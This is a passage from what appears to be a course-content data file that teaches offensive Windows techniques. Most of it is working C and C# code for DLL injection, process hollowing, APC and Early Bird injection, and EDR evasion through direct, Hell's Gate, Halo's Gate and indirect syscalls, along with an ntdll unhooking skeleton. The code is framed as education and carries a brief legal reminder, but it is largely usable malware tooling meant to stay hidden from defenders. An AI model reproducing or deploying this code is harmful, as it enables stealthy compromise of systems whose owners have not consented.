• Process Hollowing - Replace legitimate process with malicious code
• Thread Hijacking - Inject via existing threads instead of CreateRemoteThread
• APC Injection - Queue injection via Asynchronous Procedure Calls

EVASION TECHNIQUES:
• Direct Syscalls - Bypass user-mode hooks by calling NT APIs directly
• API Unhooking - Remove EDR hooks from ntdll.dll
• Heaven's Gate - Use x86/x64 transition to evade hooks
• ETW Patching - Disable Event Tracing for Windows
• AMSI Bypass - Disable Antimalware Scan Interface

TOOL IMPROVEMENTS:
• Add GUI using Win32 or Qt
• Implement pattern signature scanning
• Support memory patching and modification
• Add module enumeration and analysis
• Create persistent injection (survives process restart)

DEBUGGING & ANALYSIS:
• Learn to use x64dbg for dynamic analysis
• Master WinDbg for kernel debugging
• Study PE format in depth
• Understand IAT/EAT hooking
• Practice with Cheat Engine for reverse engineering

DEFENSIVE PERSPECTIVE:
• Learn how EDR detects these techniques
• Study Windows API hooking
• Understand kernel callbacks
• Research PatchGuard and Driver Signature Enforcement
• Analyze real malware samples (in sandboxed environment!)

RESOURCES:
• Detecting Windows Malware - Michael Sikorski
• Windows Internals - Russinovich & Solomon
• Practical Malware Analysis - Sikorski & Honig
• OpenSecurityTraining courses
• MalwareTech blog
• hasherezade's GitHub

LEGAL REMINDER:
All techniques taught here are for educational and authorized security testing only. Always get written permission before testing on systems you don't own.

FINAL PROJECT IDEAS:
1. Build a process monitor that logs all API calls
2. Create a memory forensics tool for analyzing dumps
3. Develop a simple rootkit detector
4. Build a sandbox escape testing framework
5. Create an anti-debugging detection tool`,
          code: `// ADVANCED: Manual Map Injection Skeleton
// =========================================
// This is a preview of advanced techniques

#include <windows.h>
#include <stdio.h>

// Function that will run in target process
DWORD WINAPI LoadLibraryShellcode(
    LPVOID lpParam) {
    
    // This is where manual mapping logic goes
    // 1. Parse PE headers
    // 2. Allocate memory for sections
    // 3. Copy sections to allocated memory
    // 4. Process relocations
    // 5. Resolve imports
    // 6. Call DllMain
    // 7. Return HMODULE
    
    return 0;
}

// Direct Syscall Example
// ======================
// Bypass hooks by calling kernel directly

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

NTSTATUS DirectSyscallAlloc(
    HANDLE hProcess,
    PVOID* BaseAddress,
    SIZE_T* RegionSize) {
    
    // Get syscall number for NtAllocateVirtualMemory
    // This varies by Windows version!
    WORD syscallNumber = 0x18; // Win10 x64
    
    // Call via inline assembly or syscall stub
    // __asm {
    //     mov r10, rcx
    //     mov eax, syscallNumber
    //     syscall
    // }
    
    return 0; // Placeholder
}

// API Unhooking Example
// =====================
// Remove EDR hooks from ntdll.dll

BOOL UnhookNtdll() {
    // 1. Map fresh ntdll.dll from disk
    HANDLE hFile = CreateFileW(
        L"C:\\\\Windows\\\\System32\\\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;
    
    HANDLE hMapping = CreateFileMappingW(
        hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    CloseHandle(hFile);
    
    if (!hMapping) return FALSE;
    
    LPVOID pMapping = MapViewOfFile(
        hMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMapping);
    
    if (!pMapping) return FALSE;
    
    // 2. Get current ntdll.dll in memory
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    
    // 3. Parse PE to find .text section
    PIMAGE_DOS_HEADER pDos = 
        (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pNt = 
        (PIMAGE_NT_HEADERS)((BYTE*)pMapping + 
                            pDos->e_lfanew);
    
    // 4. Copy clean .text over hooked version
    // (Implementation left as exercise)
    
    UnmapViewOfFile(pMapping);
    
    wprintf(L"[+] Ntdll.dll unhooked\\n");
    return TRUE;
}

// FURTHER STUDY:
// ==============
// 1. Complete the manual map implementation
// 2. Research syscall number retrieval
// 3. Study EDR bypass techniques
// 4. Learn kernel driver development
// 5. Analyze real-world malware

// CAUTION: These techniques can be detected
// by modern EDR solutions. Study detection
// methods alongside evasion techniques!`,
          language: "c"
        }
      ]
    },
    "process-injection": {
      title: "Process Injection & Memory Manipulation",
      sections: [
        {
          title: "1. Classic DLL Injection - The Foundation",
          content: `DLL injection forces a remote process to load your DLL by allocating memory, writing the path, and creating a remote thread that calls LoadLibrary.

WHY IT WORKS:
• Every process can call LoadLibrary to load DLLs
• CreateRemoteThread creates a thread in another process
• The thread executes your specified function (LoadLibraryA)
• Your DLL's DllMain runs in the target's context

DETECTION SURFACE:
• CreateRemoteThread is heavily monitored by EDR
• WriteProcessMemory to executable memory triggers alerts
• Suspicious modules loaded detected by module enumeration`,
          code: `#include <windows.h>
#include <stdio.h>

BOOL InjectDLL(DWORD dwPid, const char* szDll) {
    // 1. Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, dwPid);
    
    if (!hProcess) {
        printf("[-] OpenProcess failed: %lu\\n", 
               GetLastError());
        return FALSE;
    }
    
    // 2. Allocate memory for DLL path
    SIZE_T pathLen = strlen(szDll) + 1;
    LPVOID pRemoteBuf = VirtualAllocEx(
        hProcess, NULL, pathLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);
    
    if (!pRemoteBuf) {
        printf("[-] VirtualAllocEx failed\\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 3. Write DLL path to remote memory
    if (!WriteProcessMemory(hProcess, pRemoteBuf,
                            szDll, pathLen, NULL)) {
        printf("[-] WriteProcessMemory failed\\n");
        VirtualFreeEx(hProcess, pRemoteBuf, 
                      0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 4. Get LoadLibraryA address
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pfnLoadLib = 
        (LPTHREAD_START_ROUTINE)GetProcAddress(
            hKernel32, "LoadLibraryA");
    
    // 5. Create remote thread
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0, pfnLoadLib,
        pRemoteBuf, 0, NULL);
    
    if (!hThread) {
        printf("[-] CreateRemoteThread failed\\n");
        VirtualFreeEx(hProcess, pRemoteBuf, 
                      0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 6. Wait and cleanup
    WaitForSingleObject(hThread, INFINITE);
    
    printf("[+] DLL injected successfully\\n");
    
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteBuf, 
                  0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return TRUE;
}

// Example DLL (inject_dll.c)
// Compile: cl /LD inject_dll.c

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD reason,
                      LPVOID lpReserved) {
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL, 
            "Injected!", "Success", MB_OK);
        // Run your payload here
        break;
    }
    return TRUE;
}`,
          language: "c"
        },
        {
          title: "2. Process Hollowing - Running in Plain Sight",
          content: `Process hollowing creates a legitimate process in suspended state, replaces its memory with malicious code, then resumes execution. The process appears legitimate in Task Manager but runs your code.

TECHNIQUE BREAKDOWN:
1. Create legitimate process suspended (CREATE_SUSPENDED)
2. Get its base address from PEB
3. Unmap the legitimate image (NtUnmapViewOfSection)
4. Allocate new memory at same base
5. Write malicious PE file
6. Fix entry point in thread context
7. Resume thread

EVASION BENEFITS:
• Legitimate process name in Task Manager
• Legitimate parent-child relationship
• Signature verification passes (for host process)`,
          code: `#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// Link ntdll for native APIs
#pragma comment(lib, "ntdll.lib")

// Function pointer for NtUnmapViewOfSection
typedef NTSTATUS (WINAPI *pfnNtUnmapViewOfSection)(
    HANDLE, PVOID);

BOOL ProcessHollowing(const char* szTarget,
                      const char* szPayload) {
    
    // 1. Read malicious PE
    HANDLE hFile = CreateFileA(szPayload,
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, 0, NULL);
    
    DWORD dwSize = GetFileSize(hFile, NULL);
    BYTE* pImage = (BYTE*)malloc(dwSize);
    ReadFile(hFile, pImage, dwSize, &dwSize, NULL);
    CloseHandle(hFile);
    
    // 2. Create target in suspended state
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    if (!CreateProcessA(szTarget, NULL, NULL, NULL,
        FALSE, CREATE_SUSPENDED, NULL, NULL,
        &si, &pi)) {
        printf("[-] CreateProcess failed\\n");
        return FALSE;
    }
    
    printf("[+] Created suspended process: %lu\\n", 
           pi.dwProcessId);
    
    // 3. Get base address from PEB
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    // Rdx points to PEB on x64
    PVOID pPeb = (PVOID)ctx.Rdx;
    PVOID pImageBase;
    
    // ImageBase is at PEB + 0x10
    ReadProcessMemory(pi.hProcess,
        (BYTE*)pPeb + 0x10,
        &pImageBase, sizeof(pImageBase), NULL);
    
    printf("[+] Original image base: %p\\n", 
           pImageBase);
    
    // 4. Unmap original image
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pfnNtUnmapViewOfSection NtUnmap = 
        (pfnNtUnmapViewOfSection)GetProcAddress(
            hNtdll, "NtUnmapViewOfSection");
    
    NtUnmap(pi.hProcess, pImageBase);
    
    // 5. Parse PE headers
    PIMAGE_DOS_HEADER pDos = 
        (PIMAGE_DOS_HEADER)pImage;
    PIMAGE_NT_HEADERS pNt = 
        (PIMAGE_NT_HEADERS)(pImage + 
                            pDos->e_lfanew);
    
    // 6. Allocate new memory
    PVOID pNewBase = VirtualAllocEx(pi.hProcess,
        pImageBase, pNt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    
    if (!pNewBase) {
        printf("[-] VirtualAllocEx failed\\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    // 7. Write PE headers
    WriteProcessMemory(pi.hProcess, pNewBase,
        pImage, pNt->OptionalHeader.SizeOfHeaders,
        NULL);
    
    // 8. Write sections
    PIMAGE_SECTION_HEADER pSect = IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
            (BYTE*)pNewBase + pSect[i].VirtualAddress,
            pImage + pSect[i].PointerToRawData,
            pSect[i].SizeOfRawData, NULL);
    }
    
    // 9. Update entry point
    ctx.Rcx = (DWORD64)pNewBase + 
              pNt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    
    // 10. Resume execution
    printf("[+] Resuming process...\\n");
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    free(pImage);
    
    return TRUE;
}`,
          language: "c"
        },
        {
          title: "3. APC Queue Injection - Stealthy Execution",
          content: `APC (Asynchronous Procedure Call) injection queues your code to execute when a thread enters an alertable wait state. More stealthy than CreateRemoteThread as it uses Windows' legitimate alerting mechanism.

HOW IT WORKS:
• Every thread has an APC queue
• When thread enters alertable wait (SleepEx, WaitForSingleObjectEx), APCs execute
• QueueUserAPC adds function to execute
• No CreateRemoteThread = less detection

BEST TARGET THREADS:
• GUI threads (always alertable for messages)
• Threads calling Sleep/WaitForSingleObject
• Worker threads in thread pools`,
          code: `#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Shellcode to execute via APC
// This would be your actual payload
unsigned char shellcode[] = {
    0x90, 0x90, 0x90,  // NOPs (replace with real shellcode)
    0xC3                // RET
};

BOOL InjectAPC(DWORD dwPid) {
    // 1. Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, dwPid);
    
    if (!hProcess) {
        printf("[-] OpenProcess failed\\n");
        return FALSE;
    }
    
    // 2. Allocate executable memory
    LPVOID pRemoteBuf = VirtualAllocEx(hProcess,
        NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    
    if (!pRemoteBuf) {
        printf("[-] VirtualAllocEx failed\\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 3. Write shellcode
    if (!WriteProcessMemory(hProcess, pRemoteBuf,
        shellcode, sizeof(shellcode), NULL)) {
        printf("[-] WriteProcessMemory failed\\n");
        VirtualFreeEx(hProcess, pRemoteBuf, 
                      0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[+] Shellcode written to %p\\n", 
           pRemoteBuf);
    
    // 4. Enumerate threads
    HANDLE hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPTHREAD, 0);
    
    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    
    int queuedCount = 0;
    
    if (Thread32First(hSnapshot, &te)) {
        do {
            // Only queue to target process threads
            if (te.th32OwnerProcessID == dwPid) {
                HANDLE hThread = OpenThread(
                    THREAD_SET_CONTEXT, FALSE,
                    te.th32ThreadID);
                
                if (hThread) {
                    // Queue APC to thread
                    QueueUserAPC(
                        (PAPCFUNC)pRemoteBuf,
                        hThread, 0);
                    
                    queuedCount++;
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    
    CloseHandle(hSnapshot);
    
    printf("[+] Queued APC to %d threads\\n", 
           queuedCount);
    printf("[*] Waiting for alertable wait...\\n");
    
    CloseHandle(hProcess);
    return TRUE;
}

// ADVANCED: Early Bird APC
// Inject before process starts executing

BOOL EarlyBirdAPC(const char* szTarget) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Create suspended
    CreateProcessA(szTarget, NULL, NULL, NULL,
        FALSE, CREATE_SUSPENDED, NULL, NULL,
        &si, &pi);
    
    // Allocate and write shellcode
    LPVOID pBuf = VirtualAllocEx(pi.hProcess,
        NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    
    WriteProcessMemory(pi.hProcess, pBuf,
        shellcode, sizeof(shellcode), NULL);
    
    // Queue APC before process starts
    QueueUserAPC((PAPCFUNC)pBuf, 
                 pi.hThread, 0);
    
    // Resume - APC executes immediately
    ResumeThread(pi.hThread);
    
    printf("[+] Early Bird APC executed\\n");
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}`,
          language: "c"
        }
      ]
    },
    "syscalls": {
      title: "Direct Syscalls & Native API",
      sections: [
        {
          title: "1. Understanding System Service Numbers (SSN)",
          content: `Every Windows API call eventually invokes a syscall. The System Service Number (SSN) identifies which kernel function to execute. EDRs hook user-mode APIs (ntdll.dll), but direct syscalls bypass these hooks.

SSN LOCATION:
• Each Nt* function in ntdll.dll contains its SSN
• First instruction: MOV R10, RCX (save arg)
• Second instruction: MOV EAX, SSN
• Third instruction: SYSCALL

EXAMPLE (NtReadVirtualMemory):
  4C 8B D1          mov r10, rcx
  B8 3F 00 00 00    mov eax, 0x3F    ; SSN = 0x3F
  0F 05             syscall

WHY THIS MATTERS:
• SSNs change between Windows versions
• Direct syscalls skip ntdll hooks entirely
• EDR cannot monitor what they can't see`,
          code: `#include <windows.h>
#include <stdio.h>

// Define native API structures
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING* ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

// Parse SSN from function
DWORD GetSSN(BYTE* pFunc) {
    // Check for MOV EAX, imm32
    // Bytes: B8 XX XX XX XX
    if (pFunc[0] == 0x4C &&   // mov r10, rcx
        pFunc[3] == 0xB8) {   // mov eax, imm32
        // SSN is 4 bytes after 0xB8
        return *(DWORD*)(pFunc + 4);
    }
    
    return 0xFFFFFFFF;
}

void DemoSSNExtraction() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    // Get function addresses
    BYTE* pNtReadVM = (BYTE*)GetProcAddress(
        hNtdll, "NtReadVirtualMemory");
    BYTE* pNtWriteVM = (BYTE*)GetProcAddress(
        hNtdll, "NtWriteVirtualMemory");
    BYTE* pNtAllocVM = (BYTE*)GetProcAddress(
        hNtdll, "NtAllocateVirtualMemory");
    
    // Extract SSNs
    DWORD ssnRead = GetSSN(pNtReadVM);
    DWORD ssnWrite = GetSSN(pNtWriteVM);
    DWORD ssnAlloc = GetSSN(pNtAllocVM);
    
    printf("NtReadVirtualMemory SSN: 0x%X\\n", 
           ssnRead);
    printf("NtWriteVirtualMemory SSN: 0x%X\\n", 
           ssnWrite);
    printf("NtAllocateVirtualMemory SSN: 0x%X\\n",
           ssnAlloc);
}

// Manual syscall stub (x64)
// This would be in assembly file

extern "C" NTSTATUS SysNtReadVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesRead
);

// In .asm file (NASM syntax):
/*
BITS 64
DEFAULT REL

global SysNtReadVirtualMemory

SysNtReadVirtualMemory:
    mov r10, rcx
    mov eax, 0x3F        ; SSN for NtReadVirtualMemory
    syscall
    ret
*/

// Usage
void DirectSyscallExample() {
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, 1234);
    
    BYTE buffer[256];
    SIZE_T bytesRead;
    
    // Direct syscall - bypasses hooks!
    NTSTATUS status = SysNtReadVirtualMemory(
        hProcess,
        (PVOID)0x400000,
        buffer,
        sizeof(buffer),
        &bytesRead
    );
    
    if (status == 0) {  // STATUS_SUCCESS
        printf("[+] Read %zu bytes\\n", bytesRead);
    }
    
    CloseHandle(hProcess);
}`,
          language: "c"
        },
        {
          title: "2. Hell's Gate - Dynamic SSN Resolution",
          content: `Hell's Gate technique dynamically resolves SSNs at runtime by parsing ntdll.dll. This handles different Windows versions without hardcoding SSNs.

THE PROBLEM:
• SSNs differ: Win10 vs Win11
• SSNs change with updates
• Hardcoded SSNs = brittle code

HELL'S GATE SOLUTION:
1. Find function in ntdll.dll
2. Parse first few bytes
3. Extract SSN from MOV EAX
4. Store for syscall stub

DETECTION EVASION:
• No hardcoded SSNs in binary
• Works across Windows versions
• Adapts to system automatically`,
          code: `#include <windows.h>
#include <stdio.h>

typedef struct _SYSCALL_STUB {
    DWORD ssn;           // System Service Number
    PVOID pSyscallAddr;  // Address of syscall instruction
} SYSCALL_STUB;

// Parse SSN with hook detection
BOOL GetSSN_HellsGate(const char* szFunc,
                      SYSCALL_STUB* stub) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pFunc = (BYTE*)GetProcAddress(
        hNtdll, szFunc);
    
    if (!pFunc) return FALSE;
    
    // Check for hooks (JMP instruction)
    if (pFunc[0] == 0xE9 || pFunc[0] == 0xEB) {
        printf("[!] %s appears hooked!\\n", szFunc);
        // Fall back to nearby function or fail
        return FALSE;
    }
    
    // Pattern: 4C 8B D1 B8 [SSN] 00 00 00
    if (pFunc[0] == 0x4C &&
        pFunc[1] == 0x8B &&
        pFunc[2] == 0xD1 &&
        pFunc[3] == 0xB8) {
        
        stub->ssn = *(DWORD*)(pFunc + 4);
        
        // Find syscall instruction
        for (int i = 0; i < 32; i++) {
            if (pFunc[i] == 0x0F && 
                pFunc[i+1] == 0x05) {
                stub->pSyscallAddr = &pFunc[i];
                return TRUE;
            }
        }
    }
    
    return FALSE;
}

// Halo's Gate enhancement
// If function is hooked, check neighbors
BOOL GetSSN_HalosGate(const char* szFunc,
                      SYSCALL_STUB* stub) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pFunc = (BYTE*)GetProcAddress(
        hNtdll, szFunc);
    
    // Try function itself
    if (GetSSN_HellsGate(szFunc, stub))
        return TRUE;
    
    printf("[*] Function hooked, trying neighbors\\n");
    
    // Function is hooked, check nearby functions
    // SSNs are sequential in ntdll
    
    BYTE* pCurrent = pFunc;
    
    // Check down (next functions)
    for (int i = 1; i <= 5; i++) {
        // Skip to next function (average ~32 bytes)
        pCurrent += 32;
        
        // Check pattern
        if (pCurrent[0] == 0x4C &&
            pCurrent[1] == 0x8B &&
            pCurrent[2] == 0xD1 &&
            pCurrent[3] == 0xB8) {
            
            DWORD neighborSSN = *(DWORD*)(pCurrent + 4);
            // Our SSN is likely neighborSSN - i
            stub->ssn = neighborSSN - i;
            
            // Find syscall instruction
            for (int j = 0; j < 32; j++) {
                if (pCurrent[j] == 0x0F &&
                    pCurrent[j+1] == 0x05) {
                    stub->pSyscallAddr = &pCurrent[j];
                    printf("[+] Resolved SSN via neighbor: 0x%X\\n",
                           stub->ssn);
                    return TRUE;
                }
            }
        }
    }
    
    return FALSE;
}

// Dynamic syscall function
typedef NTSTATUS (*fnSyscall)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

NTSTATUS DynamicSyscall(SYSCALL_STUB* stub,
    HANDLE hProcess, PVOID addr, PVOID buf,
    SIZE_T size, PSIZE_T read) {
    
    // Build syscall on stack
    BYTE syscallStub[] = {
        0x4C, 0x8B, 0xD1,              // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, SSN
        0x0F, 0x05,                     // syscall
        0xC3                            // ret
    };
    
    // Patch in SSN
    *(DWORD*)(syscallStub + 4) = stub->ssn;
    
    // Make executable
    DWORD oldProtect;
    VirtualProtect(syscallStub, sizeof(syscallStub),
                   PAGE_EXECUTE_READ, &oldProtect);
    
    // Execute
    fnSyscall pSyscall = (fnSyscall)syscallStub;
    return pSyscall(hProcess, addr, buf, size, read);
}`,
          language: "c"
        },
        {
          title: "3. Indirect Syscalls - Maximum Stealth",
          content: `Indirect syscalls execute the syscall instruction from ntdll.dll itself, making call stack look legitimate. Instead of embedding syscall in your code, jump to ntdll's syscall.

CALL STACK DIFFERENCE:

Direct Syscall:
YourModule.exe → syscall → kernel

Indirect Syscall:
YourModule.exe → ntdll.dll → syscall → kernel

WHY IT MATTERS:
• Call stack analysis looks normal
• syscall from ntdll (expected)
• Harder for EDR to detect
• More stealthy than direct`,
          code: `#include <windows.h>
#include <stdio.h>

typedef struct _SYSCALL_INDIRECT {
    DWORD ssn;
    PVOID pSyscallInstr;  // Actual syscall in ntdll
    PVOID pSyscallRet;    // Return address after syscall
} SYSCALL_INDIRECT;

// Find a clean syscall instruction in ntdll
PVOID FindSyscallGadget() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pBase = (BYTE*)hNtdll;
    
    // Parse PE to get .text section
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = 
        (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    
    PIMAGE_SECTION_HEADER pSect = 
        IMAGE_FIRST_SECTION(pNt);
    
    // Find .text section
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSect[i].Name, ".text") == 0) {
            BYTE* pText = pBase + pSect[i].VirtualAddress;
            SIZE_T textSize = pSect[i].Misc.VirtualSize;
            
            // Search for: syscall; ret (0F 05 C3)
            for (SIZE_T j = 0; j < textSize - 3; j++) {
                if (pText[j] == 0x0F &&
                    pText[j+1] == 0x05 &&
                    pText[j+2] == 0xC3) {
                    return &pText[j];
                }
            }
        }
    }
    
    return NULL;
}

// Setup indirect syscall
BOOL SetupIndirectSyscall(const char* szFunc,
                          SYSCALL_INDIRECT* sc) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pFunc = (BYTE*)GetProcAddress(hNtdll, szFunc);
    
    if (!pFunc) return FALSE;
    
    // Get SSN
    if (pFunc[0] == 0x4C && pFunc[3] == 0xB8) {
        sc->ssn = *(DWORD*)(pFunc + 4);
    } else {
        return FALSE;
    }
    
    // Find syscall gadget
    sc->pSyscallInstr = FindSyscallGadget();
    if (!sc->pSyscallInstr) {
        printf("[-] No syscall gadget found\\n");
        return FALSE;
    }
    
    printf("[+] Using syscall at: %p\\n", 
           sc->pSyscallInstr);
    
    return TRUE;
}

// Indirect syscall stub (assembly)
/*
BITS 64
DEFAULT REL

global IndirectSyscall

IndirectSyscall:
    mov r10, rcx                ; Save RCX
    mov eax, [rsp+8]            ; Load SSN from stack
    mov r11, [rsp+16]           ; Load syscall address
    jmp r11                     ; Jump to ntdll's syscall
*/

extern "C" NTSTATUS IndirectSyscall(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T,
    DWORD, PVOID);

// Usage
void IndirectSyscallExample() {
    SYSCALL_INDIRECT sc;
    
    if (!SetupIndirectSyscall("NtReadVirtualMemory", 
                              &sc)) {
        printf("[-] Setup failed\\n");
        return;
    }
    
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, 1234);
    
    BYTE buffer[256];
    SIZE_T bytesRead;
    
    // Indirect syscall
    NTSTATUS status = IndirectSyscall(
        hProcess,
        (PVOID)0x400000,
        buffer,
        sizeof(buffer),
        &bytesRead,
        sc.ssn,              // Pass SSN
        sc.pSyscallInstr     // Pass syscall address
    );
    
    if (status == 0) {
        printf("[+] Read %zu bytes (indirect)\\n", 
               bytesRead);
    }
    
    CloseHandle(hProcess);
}

// Stack spoof for even more stealth
// Modify return address before syscall
void StackSpoofedSyscall() {
    // Advanced: Modify call stack to appear
    // as if called from legitimate Windows module
    // (Left as exercise - research ROP chains)
}`,
          language: "c"
        }
      ]
    },
    "pinvoke": {
      title: "P/Invoke & .NET Interop",
      sections: [
        {
          title: "1. P/Invoke Fundamentals - Calling Native APIs",
          content: `P/Invoke (Platform Invocation Services) allows C# to call native Win32 APIs. This is essential for offensive .NET tools since managed APIs are limited.

HOW IT WORKS:
• CLR loads native DLL (kernel32.dll, ntdll.dll)
• Marshals managed types to native types
• Calls native function
• Marshals return value back to managed

COMMON USE CASES:
• Process injection from C#
• Direct Win32 API access
• Syscalls from .NET
• Memory manipulation`,
          code: `using System;
using System.Runtime.InteropServices;
using System.Text;

class WinAPI {
    // Basic P/Invoke syntax
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwProcessId
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    // Marshalling structures
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_0;
        public IntPtr Reserved2_1;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }
    
    // Character set handling
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    public static extern uint GetModuleFileNameW(
        IntPtr hModule,
        StringBuilder lpFilename,
        uint nSize
    );
    
    // Out parameters
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out int lpNumberOfBytesRead
    );
}

class Program {
    static void Main() {
        // Open process
        uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        IntPtr hProcess = WinAPI.OpenProcess(
            PROCESS_ALL_ACCESS, false, 1234);
        
        if (hProcess == IntPtr.Zero) {
            Console.WriteLine("OpenProcess failed");
            return;
        }
        
        // Read memory
        byte[] buffer = new byte[256];
        int bytesRead;
        
        bool success = WinAPI.ReadProcessMemory(
            hProcess,
            (IntPtr)0x400000,
            buffer,
            buffer.Length,
            out bytesRead
        );
        
        Console.WriteLine($"Read {bytesRead} bytes");
        
        // Get module path
        StringBuilder path = new StringBuilder(260);
        WinAPI.GetModuleFileNameW(
            IntPtr.Zero, path, 260);
        
        Console.WriteLine($"Path: {path}");
        
        WinAPI.CloseHandle(hProcess);
    }
}

// MARSHALLING GUIDE
// =================

// Pointers: IntPtr
// Strings: StringBuilder or string
// Arrays: byte[], int[]
// Structures: [StructLayout]
// Callbacks: delegates
// Handles: IntPtr or SafeHandle

// Common attributes:
// CharSet.Unicode - wchar_t*
// CharSet.Ansi - char*
// SetLastError = true - enables Marshal.GetLastWin32Error()
// CallingConvention - for non-stdcall functions`,
          language: "csharp"
        },
        {
          title: "2. D/Invoke - Dynamic API Resolution",
          content: `D/Invoke dynamically resolves APIs at runtime using GetProcAddress, avoiding static imports that EDR can enumerate. This is P/Invoke's stealthy cousin.

WHY D/INVOKE:
• No imports in PE file
• API names not visible in strings
• Can resolve from memory-mapped DLLs
• Defeats static analysis

THE TECHNIQUE:
1. LoadLibrary or manual map DLL
2. GetProcAddress for function
3. Marshal.GetDelegateForFunctionPointer
4. Call as normal delegate`,
          code: `using System;
using System.Runtime.InteropServices;

class DInvoke {
    // Delegate matching native function signature
    [UnmanagedFunctionPointer(CallingConvention.StdCall,
                              SetLastError = true)]
    public delegate IntPtr OpenProcessDelegate(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwProcessId
    );
    
    // Load kernel32.dll
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(
        IntPtr hModule, string lpProcName);
    
    // Generic D/Invoke wrapper
    public static Delegate GetAPIDelegate<T>(
        string moduleName, string functionName) {
        
        // Load DLL
        IntPtr hModule = LoadLibrary(moduleName);
        if (hModule == IntPtr.Zero) {
